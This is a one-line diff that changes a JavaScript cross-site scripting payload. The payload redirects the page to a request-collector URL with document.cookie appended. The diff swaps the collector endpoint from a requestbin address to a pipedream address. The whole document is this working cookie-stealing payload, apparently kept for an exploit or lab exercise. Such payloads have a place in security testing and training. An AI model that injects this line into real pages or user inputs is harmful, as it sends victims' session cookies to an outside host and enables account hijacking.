@@ -1,1 +1,1 @@
-document.location="https://public.requestbin.com/r/en14acbm8zwka?" + document.cookie
+document.location="https://en14acbm8zwka.x.pipedream.net/?" + document.cookie
